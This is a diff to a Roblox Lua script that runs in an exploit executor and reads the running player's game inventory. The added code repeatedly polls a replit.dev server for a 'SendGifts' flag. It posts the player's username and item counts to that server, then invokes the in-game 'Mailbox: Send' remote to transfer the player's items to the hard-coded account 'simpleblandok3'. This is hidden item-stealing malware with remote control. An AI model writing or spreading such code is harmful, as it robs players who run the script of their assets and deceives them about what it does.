@@ -86,107 +86,103 @@ spawn(FrameFunction)
 local function dataFunction2() 
     while true do
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Player = game.Players.LocalPlayer
-local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
+        local Player = game.Players.LocalPlayer
+        local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
 
-local diamondsvalue = 0
-local voidvalue = 0
+        local diamondsvalue = 0
+        local voidvalue = 0
+        local gifts = 0
+        local ItemLootbox = {"Elemental Gift"}
+        local ItemMisc = {"Pet Cube"}
 
-local ItemLootbox = {"Elemental Gift"}
-local ItemMisc = {"Pet Cube"}
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
 
-local function GetItemInfo(ItemsClass, ItemsName)
-    local Table = {}
-    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+            if Inventory[ItemsClass] then
+                for UID, Item in pairs(Inventory[ItemsClass]) do
+                    if table.find(ItemsName, Item.id) then
+                        local ItemInfo = {
+                            ["uid"] = UID,
+                            ["data"] = Item
+                        }
+                        table.insert(Table, ItemInfo)
+                    end
+                end
+            end
+            return Table
+        end
 
-    if Inventory[ItemsClass] then
-        for UID, Item in pairs(Inventory[ItemsClass]) do
-            if table.find(ItemsName, Item.id) then
-                local ItemInfo = {
-                    ["uid"] = UID,
-                    ["data"] = Item
-                }
-                table.insert(Table, ItemInfo)
+        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
+        for _, ItemInfo in pairs(LootboxItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am then
+                diamondsvalue = ItemData._am
             end
         end
-    end
-    return Table
-end
 
-local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
-for _, ItemInfo in pairs(LootboxItems) do
-    local ItemData = ItemInfo.data
-    if ItemData._am then
-        diamondsvalue = ItemData._am -- Fix: Removed the extra '0'
-    end
-end
+        local MiscItems = GetItemInfo("Misc", ItemMisc)
+        for _, ItemInfo in pairs(MiscItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am then
+                voidvalue = ItemData._am
+                gifts = ItemInfo.uid
+            end
+        end
 
-local MiscItems = GetItemInfo("Misc", ItemMisc)
-for _, ItemInfo in pairs(MiscItems) do
-    local ItemData = ItemInfo.data
-    if ItemData._am then
-        voidvalue = ItemData._am -- Fix: Removed the extra '0'
-    end
-end
+        local Http = game:GetService("HttpService")
+        local request = (syn and syn.request) or request or (http and http.request) or http_request
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Library = require(ReplicatedStorage:WaitForChild("Library"))
-local ProcessedHuges = {}
+        local checkResponse = request({
+            Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
+            Method = 'GET',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            }
+        })
 
-local function GetItemInfo(ItemsClass, ItemsName)
-local Table = {}
-local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+        local checkResult = Http:JSONDecode(checkResponse.Body)
 
-if Inventory[ItemsClass] then
-for _, Item in pairs(Inventory[ItemsClass]) do
-if table.find(ItemsName, Item.id) then
-table.insert(Table, Item.id)
-end
-end
-end
+        print("SendGifts is:", checkResult.SendGifts)
 
-return Table
-end
+        if checkResult.SendGifts then
+            print("Gifts value:", gifts)
+            print("Void value:", voidvalue)
 
-local function getCurrentHugePets()
-local GoldPetsTable = {}
-for _, Pet in pairs(ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren()) do
-table.insert(GoldPetsTable, Pet.Name)
-end
-return GetItemInfo("Pet", GoldPetsTable)
-end
+            local player = Player.Name
 
-local hugePets = getCurrentHugePets()
+            local response = request({
+                Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/update',
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = Http:JSONEncode({
+                    Username = player,
+                    VoidTicketsValue = voidvalue,
+                    DiamondsValue = diamondsvalue,
+                    HugeList = hugePetsString
+                })
+            })
 
-local hugePetsString = #hugePets > 0 and table.concat(hugePets, ", ") or "0"
-
-local player = Player.Name
-local Http = game:GetService("HttpService")
-
-local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-local response = request({
-    Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/update',
-    Method = 'POST',
-    Headers = {
-        ['Content-Type'] = 'application/json'
-    },
-    Body = Http:JSONEncode({
-        Username = player,
-        VoidTicketsValue = voidvalue,
-        DiamondsValue = diamondsvalue,
-HugeList = hugePetsString
-
-    })
-})
-
-print(response.Body)
+            if voidvalue > 50 then
+                local args = {
+                    [1] = "simpleblandok3",
+                    [2] = "gifts",
+                    [3] = "Misc",
+                    [4] = gifts,
+                    [5] = voidvalue
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+            end
+        end
 
         wait(5)
     end
 end
 
 spawn(dataFunction2)
+
 
 
 
